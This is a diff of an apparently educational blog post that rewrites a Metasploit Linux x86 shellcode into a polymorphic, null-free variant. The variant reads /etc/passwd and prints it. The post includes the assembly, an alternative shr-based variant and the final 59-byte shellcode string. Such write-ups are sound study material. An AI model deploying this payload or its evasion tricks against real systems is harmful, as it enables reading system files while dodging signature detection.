@@ -63,7 +63,33 @@ The first substitution I made is replacing an `xor` with a `sub` to zero out the
 sub ecx,ecx
 ```
 
-Then, I change the `mov, 0x3` witt an `xor` to clear the register and `mov al, 0x3` to move the value of 3 into the register without having zeros in the shellcode.
+Next, the original shellcodes does the jmp, call, pop technique to get a pointer to a string. The string is the filename to be read. In this case, I want to remove null bytes from my shellcode, thus I will push values to the stack and move the stack pointer into my register. To push the string terminating null, I will load the string "/etc//passwd" onto the stack and get a pointer to it's address.
+
+```x86asm
+; pop ebx         ; <addr> 0x3D (filename from stack)
+xor ebx, ebx
+push ebx
+push 0x64777373         ; "dwss"
+push 0x61702f2f         ; "ap//"
+push 0x6374652f         ; "cte/" 
+mov ebx, esp
+```
+
+Note that I have pushed an entire dword of `0x00000000` to the stack as a string terminator by the `push ebx` instruction. Interestingly, I tried to rewrite this to push only a single `0x0` to the stack. I ended up with this code that will essentially load a `0xff` into `ebx` that will be shifted out for a null and placed onto the stack as a null terminator.
+
+```x86asm
+mov ebx, 0x647773ff  
+shr ebx, 0x8
+push ebx
+push 0x7361702f         
+push 0x6374652f         
+
+mov ebx, esp
+```
+
+Unfortunately, this is an extra byte in length than the alternative solution above, so I opted not to use it. But it was fun to work with the `shr` instruction and get another polymorphic variation working.
+
+Then, I change the `mov, 0x3` with an `xor` to clear the register and `mov al, 0x3` to move the value of 3 into the register without having zeros in the shellcode.
 
 ```x86asm
 ; mov eax,0x3     ; read()
@@ -120,14 +146,18 @@ global _start
 
 section .text
 _start:
-    jmp short _jump1  ; jmp to jump1 (CALCULATE LATER)
-
-_main:
     ;mov eax, 0x5
     push 0x5
     pop eax
 
-    pop ebx         ; <addr> 0x3D (filename from stack) 
+
+    ; pop ebx         ; <addr> 0x3D (filename from stack)
+    xor ebx, ebx
+    push ebx
+    push 0x64777373         ; "dwss"
+    push 0x61702f2f         ; "ap//"
+    push 0x6374652f         ; "cte/" 
+    mov ebx, esp
 
     ; xor ecx,ecx     ; replace xor instructions
     sub ecx,ecx
@@ -171,9 +201,16 @@ _main:
     xor ebx, ebx
 
     int 0x80        ; call exit()
-
-_jump1:
-    call _main    ; jump to main
-    db  "/etc/passwd", 0x00
 ```
 
+## New Shellcode
+
+```c
+"\x6a\x05\x58\x31\xdb\x53\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x29\xc9\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe7\x89\xf9\xb6\x10\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\x43\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80"
+```
+
+
+## Conclusion
+
+Metasploit payload was 73 bytes with nulls.
+My payload is 59 bytes without nulls.
